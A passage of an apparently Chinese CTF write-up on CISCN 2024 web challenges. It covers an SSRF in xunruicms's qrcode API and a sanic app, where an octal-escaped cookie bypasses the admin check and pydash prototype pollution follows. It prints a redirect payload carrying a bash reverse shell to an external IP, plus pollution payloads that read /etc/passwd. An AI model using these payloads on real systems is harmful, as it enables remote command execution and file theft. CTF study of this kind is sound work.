            <span class="token string single-quoted-string">'http'</span> <span class="token operator">=></span> <span class="token punctuation">[</span>
                <span class="token string single-quoted-string">'method'</span>  <span class="token operator">=></span> <span class="token string single-quoted-string">'GET'</span><span class="token punctuation">,</span>
                <span class="token string single-quoted-string">'timeout'</span> <span class="token operator">=></span> <span class="token variable">$timeout</span><span class="token punctuation">,</span>
            <span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'https'</span> <span class="token operator">=></span> <span class="token punctuation">[</span>
                <span class="token string single-quoted-string">'method'</span>  <span class="token operator">=></span> <span class="token string single-quoted-string">'GET'</span><span class="token punctuation">,</span>
                <span class="token string single-quoted-string">'timeout'</span> <span class="token operator">=></span> <span class="token variable">$timeout</span><span class="token punctuation">,</span>
            <span class="token punctuation">]</span>
        <span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$ptl</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"https://"</span> <span class="token operator">?</span> <span class="token string single-quoted-string">'https'</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">'http'</span><span class="token punctuation">;</span>
        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">stream_context_create</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
            <span class="token variable">$ptl</span> <span class="token operator">=></span> <span class="token variable">$opt</span><span class="token punctuation">[</span><span class="token variable">$ptl</span><span class="token punctuation">]</span>
        <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>一眼<code>curl_exec</code>等ssrf相关的函数，那么接下来找一下在哪调用这个方法的</p>
<p><img src="/blog/2024/05/18/CISCN2024/image-20240518214200055.png" alt="image-20240518214200055"></p>
<p>首先排除前面几个要admin的，直接看 xunruicms&#x2F;dayrui&#x2F;Fcms&#x2F;Control&#x2F;Api&#x2F;Api.php</p>
<p>发现这里的参数 thumb 可控，就这个了</p>
<p>仔细看一下，可以发现进else的条件是<code>    $file = WRITEPATH.&#39;file/qrcode-&#39;.md5($value.$thumb.$matrixPointSize.$errorCorrectionLevel).&#39;-qrcode.png&#39;;</code>不存在，所以我们每次打payload的时候都要更换其中变量的值，比如这里的<code>$value</code>，就是每次要更换 text 参数值</p>
<p>那接下来就很简单了</p>
<p>本地准备exp.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:http://127.0.0.1/flag.php?cmd=bash%20-c%20'bash%20-i%20>&amp;%20/dev/tcp/115.236.153.172/13314%20&lt;&amp;1'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>payload：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span>index<span class="token operator">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>api<span class="token operator">&amp;</span>c<span class="token operator">=</span>api<span class="token operator">&amp;</span>m<span class="token operator">=</span>qrcode<span class="token operator">&amp;</span>text<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>thumb<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//76135132qk.imdo.co/exp.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2024/05/18/CISCN2024/image-20240519155431792.png" alt="image-20240519155431792"></p>
<p><img src="/blog/2024/05/18/CISCN2024/image-20240519155448681.png" alt="image-20240519155448681"></p>
<hr>
<h2 id="sanic（复现）"><a href="#sanic（复现）" class="headerlink" title="sanic（复现）"></a>sanic（复现）</h2><p>&#x2F;src路由</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> sanic <span class="token keyword">import</span> Sanic
<span class="token keyword">from</span> sanic<span class="token punctuation">.</span>response <span class="token keyword">import</span> text<span class="token punctuation">,</span> html
<span class="token keyword">from</span> sanic_session <span class="token keyword">import</span> Session
<span class="token keyword">import</span> pydash
<span class="token comment"># pydash==5.1.2</span>


<span class="token keyword">class</span> <span class="token class-name">Pollute</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span>


app <span class="token operator">=</span> Sanic<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>static<span class="token punctuation">(</span><span class="token string">"/static/"</span><span class="token punctuation">,</span> <span class="token string">"./static/"</span><span class="token punctuation">)</span>
Session<span class="token punctuation">(</span>app<span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> html<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'static/index.html'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">)</span>
<span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>
    user <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> user<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'adm;n'</span><span class="token punctuation">:</span>
        request<span class="token punctuation">.</span>ctx<span class="token punctuation">.</span>session<span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">True</span>
        <span class="token keyword">return</span> text<span class="token punctuation">(</span><span class="token string">"login success"</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> text<span class="token punctuation">(</span><span class="token string">"login fail"</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/src"</span><span class="token punctuation">)</span>
<span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">src</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> text<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/admin"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">admin</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>ctx<span class="token punctuation">.</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        key <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">[</span><span class="token string">'key'</span><span class="token punctuation">]</span>
        value <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">[</span><span class="token string">'value'</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> key <span class="token keyword">and</span> value <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token builtin">str</span> <span class="token keyword">and</span> <span class="token string">'_.'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> key<span class="token punctuation">:</span>
            pollute <span class="token operator">=</span> Pollute<span class="token punctuation">(</span><span class="token punctuation">)</span>
            pydash<span class="token punctuation">.</span>set_<span class="token punctuation">(</span>pollute<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span>
            <span class="token keyword">return</span> text<span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> text<span class="token punctuation">(</span><span class="token string">"forbidden"</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> text<span class="token punctuation">(</span><span class="token string">"forbidden"</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>审一下代码</p>
<p>&#x2F;login路由</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">)</span>
<span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>
    user <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> user<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'adm;n'</span><span class="token punctuation">:</span>
        request<span class="token punctuation">.</span>ctx<span class="token punctuation">.</span>session<span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">True</span>
        <span class="token keyword">return</span> text<span class="token punctuation">(</span><span class="token string">"login success"</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> text<span class="token punctuation">(</span><span class="token string">"login fail"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>一开始就被卡住了，这个cookie里的user要为<code>adm;n</code>，然而sanic不会自动转换url编码和unicode编码</p>
<h3 id="sanic解析绕过cookie检测"><a href="#sanic解析绕过cookie检测" class="headerlink" title="sanic解析绕过cookie检测"></a>sanic解析绕过cookie检测</h3><p>这个时候要去审计sanic的源码</p>
<p><img src="/blog/2024/05/18/CISCN2024/image-20240520195415031.png" alt="image-20240520195415031"></p>
<p>看一下它解析cookie的方法：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">parse_cookie</span><span class="token punctuation">(</span>raw<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Dict<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
    cookies<span class="token punctuation">:</span> Dict<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>

    <span class="token keyword">for</span> token <span class="token keyword">in</span> raw<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">";"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        name<span class="token punctuation">,</span> sep<span class="token punctuation">,</span> value <span class="token operator">=</span> token<span class="token punctuation">.</span>partition<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span>
        name <span class="token operator">=</span> name<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
        value <span class="token operator">=</span> value<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>

        <span class="token comment"># Support cookies =value or plain value with no name</span>
        <span class="token comment"># https://github.com/httpwg/http-extensions/issues/159</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> sep<span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> name<span class="token punctuation">:</span>
                <span class="token comment"># Empty value like ;; or a cookie header with no value</span>
                <span class="token keyword">continue</span>
            name<span class="token punctuation">,</span> value <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">,</span> name

        <span class="token keyword">if</span> COOKIE_NAME_RESERVED_CHARS<span class="token punctuation">.</span>search<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># no cov</span>
            <span class="token keyword">continue</span>

        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">2</span> <span class="token keyword">and</span> value<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'"'</span> <span class="token keyword">and</span> value<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'"'</span><span class="token punctuation">:</span>  <span class="token comment"># no cov</span>
            value <span class="token operator">=</span> _unquote<span class="token punctuation">(</span>value<span class="token punctuation">)</span>

        <span class="token keyword">if</span> name <span class="token keyword">in</span> cookies<span class="token punctuation">:</span>
            cookies<span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>value<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            cookies<span class="token punctuation">[</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>value<span class="token punctuation">]</span>

    <span class="token keyword">return</span> cookies<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以发现这里确实会通过<code>;</code>来将原始字符串分割成多个子字符串，跟进一下匹配的规则</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">COOKIE_NAME_RESERVED_CHARS <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span>
    <span class="token string">'[\x00-\x1F\x7F-\xFF()&lt;>@,;:\\\\"/[\\]?=&#123;&#125; \x09]'</span>
<span class="token punctuation">)</span>
OCTAL_PATTERN <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r"\\[0-3][0-7][0-7]"</span><span class="token punctuation">)</span>
QUOTE_PATTERN <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r"[\\]."</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>发现这里的匹配只匹配0到7，也就是说我们可以用八进制来绕过，python会自动转义八进制<strong>字符串</strong></p>
<p><img src="/blog/2024/05/18/CISCN2024/image-20240520195333927.png" alt="image-20240520195333927"></p>
<p>那么cookie为</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">user="adm\073n"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>注意必须要引号</p>
<p><img src="/blog/2024/05/18/CISCN2024/image-20240520194523756.png" alt="image-20240520194523756"></p>
<p><img src="/blog/2024/05/18/CISCN2024/image-20240520195633426.png" alt="image-20240520195633426"></p>
<p>接下来就能进admin路由了</p>
<p>&#x2F;admin路由</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/admin"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">admin</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>ctx<span class="token punctuation">.</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        key <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">[</span><span class="token string">'key'</span><span class="token punctuation">]</span>
        value <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">[</span><span class="token string">'value'</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> key <span class="token keyword">and</span> value <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token builtin">str</span> <span class="token keyword">and</span> <span class="token string">'_.'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> key<span class="token punctuation">:</span>
            pollute <span class="token operator">=</span> Pollute<span class="token punctuation">(</span><span class="token punctuation">)</span>
            pydash<span class="token punctuation">.</span>set_<span class="token punctuation">(</span>pollute<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span>
            <span class="token keyword">return</span> text<span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> text<span class="token punctuation">(</span><span class="token string">"forbidden"</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> text<span class="token punctuation">(</span><span class="token string">"forbidden"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="pydash原型链污染"><a href="#pydash原型链污染" class="headerlink" title="pydash原型链污染"></a>pydash原型链污染</h3><p>pydash &#x3D;&#x3D; 5.1.2，有<a target="_blank" rel="noopener" href="https://gist.github.com/CalumHutton/45d33e9ea55bf4953b3b31c84703dfca">CVE-2023-26145</a>和pydash原型链污染，因为这里用了<code>pydash.set_</code>，那么应该是原型链污染</p>
<p>参考文章：<a target="_blank" rel="noopener" href="https://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/">https://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/</a></p>
<p>这里过滤了<code>_.</code>，常规的方法感觉都绕不过去，既然这里选择了pydash那么我们再翻翻pydash的源码看一下</p>
<p><img src="/blog/2024/05/18/CISCN2024/image-20240520200933130.png" alt="image-20240520200933130"></p>
<p>发现这里可以利用多次转义的操作最终解析出<code>.</code>：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">_\\\\<span class="token punctuation">.</span>
_\\<span class="token punctuation">.</span>
_\<span class="token punctuation">.</span>
_<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="污染-file"><a href="#污染-file" class="headerlink" title="污染__file__"></a>污染__file__</h3><p>而提到python的原型链污染，想起了之前<a href="https://c1oudfl0w0.github.io/blog/2023/07/25/DASCTF-2023-0X401/#%E9%9D%9E%E9%A2%84%E6%9C%9F-%E6%B1%A1%E6%9F%93-static-folder%E8%8E%B7%E5%8F%96%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F">dasctf &amp; 0X401 EzFlask</a>里面pop神污染静态文件变量的操作</p>
<p>这里也可以，尝试污染<code>__file__</code></p>
<p><img src="/blog/2024/05/18/CISCN2024/image-20240520211135998.png" alt="image-20240520211135998"></p>
<p>payload：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token string">"key"</span><span class="token punctuation">:</span><span class="token string">"__init__\\\\.__globals__\\\\.__file__"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">:</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2024/05/18/CISCN2024/image-20240520203731670.png" alt="image-20240520203731670"></p>
<p><img src="/blog/2024/05/18/CISCN2024/image-20240520203743979.png" alt="image-20240520203743979"></p>
<p>ctfshow的复现环境可以直接读<code>/proc/1/environ</code>获取环境变量里的flag</p>
<p><img src="/blog/2024/05/18/CISCN2024/image-20240520203843029.png" alt="image-20240520203843029"></p>
<h3 id="寻找污染链"><a href="#寻找污染链" class="headerlink" title="寻找污染链"></a>寻找污染链</h3><p>正确的做法貌似最终需要列出目录，污染<code>static</code>的<code>DirectoryHandler</code>和<code>directory_view</code>和<code>_parts</code>为<code>True</code>和<code>/</code></p>
<p>即目标是<code>app.static(&quot;/static/&quot;, &quot;./static/&quot;)</code></p>
<p><img src="/blog/2024/05/18/CISCN2024/image-20240520205253702.png" alt="image-20240520205253702"></p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"key"</span><span class="token operator">:</span><span class="token string">"__init__\\\\.__globals__\\\\.app.signal_router._future_statics.1857365850384.11"</span><span class="token punctuation">,</span><span class="token property">"value"</span><span class="token operator">:</span><span class="token string">"True"</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span><span class="token property">"key"</span><span class="token operator">:</span><span class="token string">"__init__\\\\.__globals__\\\\.app.signal_router._future_statics.1857365850384.10"</span><span class="token punctuation">,</span><span class="token property">"value"</span><span class="token operator">:</span><span class="token string">"True"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>但是参数太多了，调试根本看不过来，上面那串数字估计是随机的。。。</p>
<p>还是得回到sanic的源码，f12直接跟进</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">static</span><span class="token punctuation">(</span>
    self<span class="token punctuation">,</span>
    uri<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span>
    file_or_directory<span class="token punctuation">:</span> Union<span class="token punctuation">[</span>PathLike<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    pattern<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">r"/?.+"</span><span class="token punctuation">,</span>
    use_modified_since<span class="token punctuation">:</span> <span class="token builtin">bool</span> <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">,</span>
    use_content_range<span class="token punctuation">:</span> <span class="token builtin">bool</span> <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span>
    stream_large_files<span class="token punctuation">:</span> Union<span class="token punctuation">[</span><span class="token builtin">bool</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span>
    name<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"static"</span><span class="token punctuation">,</span>
    host<span class="token punctuation">:</span> Optional<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
    strict_slashes<span class="token punctuation">:</span> Optional<span class="token punctuation">[</span><span class="token builtin">bool</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
    content_type<span class="token punctuation">:</span> Optional<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
    <span class="token builtin">apply</span><span class="token punctuation">:</span> <span class="token builtin">bool</span> <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">,</span>
    resource_type<span class="token punctuation">:</span> Optional<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
    index<span class="token punctuation">:</span> Optional<span class="token punctuation">[</span>Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> Sequence<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
    directory_view<span class="token punctuation">:</span> <span class="token builtin">bool</span> <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span>
    directory_handler<span class="token punctuation">:</span> Optional<span class="token punctuation">[</span>DirectoryHandler<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>参数有这些，在底下对参数的注释中看到</p>
<p><img src="/blog/2024/05/18/CISCN2024/image-20240523000326648.png" alt="image-20240523000326648"></p>
<p><code>directory_view</code>为True时，会开启列目录功能；而<code>directory_handler</code>中可以获取指定的目录</p>
<p>跟进<code>directory_handler</code></p>
<p><img src="/blog/2024/05/18/CISCN2024/image-20240523000516400.png" alt="image-20240523000516400"></p>
<p>发现调用了<code>DirectoryHandler</code>类，继续跟进</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">DirectoryHandler</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""Serve files from a directory.

    Args:
        uri (str): The URI to serve the files at.
        directory (Path): The directory to serve files from.
        directory_view (bool): Whether to show a directory listing or not.
        index (Optional[Union[str, Sequence[str]]]): The index file(s) to
            serve if the directory is requested. Defaults to None.
    """</span>

    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>
        self<span class="token punctuation">,</span>
        uri<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span>
        directory<span class="token punctuation">:</span> Path<span class="token punctuation">,</span>
        directory_view<span class="token punctuation">:</span> <span class="token builtin">bool</span> <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span>
        index<span class="token punctuation">:</span> Optional<span class="token punctuation">[</span>Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> Sequence<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
    <span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
